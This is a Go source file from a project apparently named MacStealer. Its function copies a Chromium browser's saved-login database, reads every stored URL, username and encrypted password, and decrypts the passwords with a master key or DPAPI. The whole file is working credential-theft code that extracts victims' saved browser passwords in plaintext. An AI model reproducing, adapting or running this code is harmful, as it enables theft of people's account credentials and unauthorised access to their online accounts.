package browsingdata

import (
	"database/sql"
	"encoding/base64"
	"fmt"
	"log"
	"os"
	"time"

	_ "github.com/mattn/go-sqlite3"
	"github.com/ultra-supara/MacStealer/decrypter"
	"github.com/ultra-supara/MacStealer/util"
)

type loginData struct {
	LoginUrl    string `json:"url"`
	UserName    string `json:"username"`
	encryptPass []byte
	encryptUser []byte
	Password    string    `json:"password"`
	CreateDate  time.Time `json:"create_date"`
}

func GetLoginData(base64MasterKey string, path string) ([]loginData, error) {
	// Decode masterkey
	key, err := base64.StdEncoding.DecodeString(base64MasterKey)
	if err != nil {
		return nil, fmt.Errorf("Failed to decode master key: %w", err)
	}

	// Copy logindata db and journal file to current directory
	ldFile := "./logindata"
	err = util.FileCopy(path, ldFile)
	if err != nil {
		return nil, fmt.Errorf("DB FileCopy failed: %w", err)
	}
	defer os.Remove(ldFile)

	// Read Password
	loginDB, err := sql.Open("sqlite3", fmt.Sprintf("file:%s", ldFile))
	if err != nil {
		return nil, err
	}
	defer loginDB.Close()
	rows, err := loginDB.Query("SELECT origin_url, username_value, password_value, date_created FROM logins")
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var ld []loginData
	for rows.Next() {
		var (
			url, username string
			pwd, password []byte
			create        int64
		)
		if err := rows.Scan(&url, &username, &pwd, &create); err != nil {
			log.Println(err)
		}
		login := loginData{
			UserName:    username,
			encryptPass: pwd,
			LoginUrl:    url,
		}
		if len(pwd) > 0 {
			var err error
			// Decrypt encrypted data
			if key == nil {
				password, err = decrypter.DPApi(pwd)
			} else {
				password, err = decrypter.Chromium(key, pwd)
			}
			if err != nil {
				log.Printf("Failed to decrypt password. Password: %v. Error: %v", pwd, err)
			}
		}
		if create > time.Now().Unix() {
			login.CreateDate = util.TimeEpoch(create)
		} else {
			login.CreateDate = util.TimeStamp(create)
		}
		login.Password = string(password)
		ld = append(ld, login)
	}
	return ld, nil
}
